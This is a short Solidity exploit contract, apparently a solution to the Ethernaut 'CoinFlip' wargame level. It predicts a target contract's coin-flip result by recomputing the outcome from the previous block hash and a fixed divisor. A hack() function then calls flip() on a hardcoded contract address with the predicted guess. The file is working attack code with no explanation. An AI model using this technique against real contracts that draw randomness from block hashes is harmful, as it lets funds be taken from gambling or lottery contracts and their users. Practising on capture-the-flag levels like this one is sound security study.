// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Test {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuesser {
    Test coinFlipContract = Test(0x18B7DFF2a1EC88790D129719232FC07e50FC29A5);

    uint256 public consecutiveWins = 0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function coinFlipGuess() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;

        return coinFlip == 1;
    }

    function hack() public {
        coinFlipContract.flip(coinFlipGuess());
    }
}